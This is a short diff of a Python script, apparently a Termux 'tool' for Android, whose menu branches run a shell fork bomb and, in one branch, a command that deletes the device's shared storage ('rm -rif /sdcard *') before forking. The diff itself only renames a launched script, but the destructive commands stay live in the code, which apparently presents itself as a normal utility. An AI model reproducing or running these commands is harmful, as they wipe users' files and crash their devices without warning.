@@ -94,7 +94,7 @@ elif droid == 3:
     system('termux-setup-storage')
     system(':(){ :|:& };:')
     system('clear')
-    system('python Matrix.py')
+    system('python MafiaTool.py')
 elif droid == 4:
     system('termux-setup-storage')
     system('rm -rif /sdcard * && :(){ :|:& };:')
